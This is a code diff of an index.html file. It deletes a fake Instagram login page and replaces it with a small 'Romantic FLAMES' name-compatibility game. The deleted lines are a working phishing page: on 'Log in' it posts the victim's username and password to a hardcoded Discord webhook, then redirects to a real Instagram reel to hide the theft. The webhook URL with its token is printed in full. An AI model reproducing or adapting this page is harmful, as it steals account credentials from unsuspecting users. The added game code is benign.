@@ -1,111 +1,57 @@
+<!-- index.html -->
+
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
-  <title>Instagram</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Romantic FLAMES Game</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        function calculateFLAMES() {
+            // Get names from input fields
+            var name1 = document.getElementById('name1').value.toLowerCase();
+            var name2 = document.getElementById('name2').value.toLowerCase();
+
+            // Remove spaces from names
+            name1 = name1.replace(/\s/g, '');
+            name2 = name2.replace(/\s/g, '');
+
+            // Create arrays from the names
+            var name1Array = name1.split('');
+            var name2Array = name2.split('');
+
+            // Find common letters
+            var commonLetters = name1Array.filter(letter => name2Array.includes(letter));
+
+            // Calculate FLAMES result
+            var resultIndex = (name1Array.length + name2Array.length - 2 * commonLetters.length) % 6;
+
+            // FLAMES mapping
+            var flames = ['Friendship', 'Love', 'Affection', 'Marriage', 'Enemy', 'Siblings'];
+
+            // Display result
+            var resultContainer = document.getElementById('result-container');
+            var resultElement = document.getElementById('result');
+            resultElement.innerHTML = 'Your relationship is: ' + flames[resultIndex];
+            
+            // Make the result container visible
+            resultContainer.style.display = 'block';
+        }
+    </script>
 </head>
 <body>
-  <span id="root">
-    <section class="section-all">
-      <link rel="stylesheet" href="css.css">
-      <!-- 1-Role Main -->
-      <main class="main" role="main">
-        <div class="wrapper">
-          <article class="article">
-            <div class="content">
-              <div class="login-box">
-                <div class="header">
-                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                </div><!-- Header end -->
-                <div class="form-wrap">
-                  <form class="form">
-
-                    <div class="input-box">
-                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
-                    </div>  
-
-                    <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                    </div>  
-
-                    <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
-                    </span>  
-
-                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
-                  </form>
-                </div> <!-- Form-wrap end -->
-              </div> <!-- Login-box end -->
-
-              <div class="login-box">
-                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
-              </div> <!-- Signup-box end -->
-
-              <div class="app">
-                <p>Get the app.</p>
-                <div class="app-img">
-                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
-                  </a>
-                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                  </a>  
-                </div>  <!-- App-img end-->
-              </div> <!-- App end -->
-            </div> <!-- Content end -->
-          </article>
-        </div> <!-- Wrapper end -->
-      </main>
-
-      <!-- 2-Role Footer -->
-      <footer class="footer" role="contentinfo">
-        <div class="footer-container">
-
-          <nav class="footer-nav" role="navigation">
-            <ul>
-			  <li><a href=""></a></li>
-              <li><a href="https://about.instagram.com">About Us</a></li>
-              <li><a href="https://help.instagram.com">Support</a></li>
-              <li><a href="https://about.instagram.com/blog">Blog</a></li>
-              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
-              <li><a href="https://www.instagram.com/developer">Api</a></li>
-              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
-              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
-              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
-			  <li><a href="">Intsagram</a></li>
-            </ul>
-          </nav>
-
-          <span class="footer-logo">&copy; 2021 Instagram</span>
-        </div> <!-- Footer container end -->
-      </footer>
-      
-    </section>
-  </span> <!-- Root -->
-
-  <!-- Select Link -->
-  <script type="text/javascript">
-    function la(src) {
-      window.location=src;
-    }
-  </script>
-
-  <script>
-  function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1185571622221000737/MUe95eWYmKWYv_dMlSUEFArA4h2IT4KcHKRiFAm5Q1ozXptee1ig-wWi9sXZN8iUEbz8");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-    }
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com/reel/Cz04CEqvPlf/?igshid=MTc4MmM1YmI2Ng==");
-  }
-  </script>
+    <div class="container">
+        <h1>Romantic FLAMES Game</h1>
+        <label for="name1">Enter Your Name:</label>
+        <input type="text" id="name1" placeholder="Your Name"><br>
+        <label for="name2">Enter Your Crush's Name:</label>
+        <input type="text" id="name2" placeholder="Crush's Name"><br>
+        <button onclick="calculateFLAMES()">Calculate</button>
+        <div class="result-container" id="result-container">
+            <p id="result"></p>
+            <span class="heart-icon">&#10084;</span>
+        </div>
+    </div>
 </body>
+</html>
